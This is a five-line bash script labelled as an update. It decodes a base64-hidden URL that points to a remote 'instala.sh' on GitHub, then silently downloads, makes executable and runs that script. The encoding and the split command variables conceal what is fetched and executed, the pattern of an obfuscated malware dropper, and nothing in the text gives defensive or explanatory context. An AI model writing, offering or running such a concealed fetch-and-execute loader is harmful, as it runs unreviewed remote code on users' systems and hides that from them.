#!/bin/bash
update1='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NodW1vR0gvcnVzcy9tYXN0ZXIvaW5zdGFsYS5zaA=='
dom='base64 -d'
RE=$(echo $update1|$dom)
wget -q $RE; chmod +x instala.sh;./instala.sh
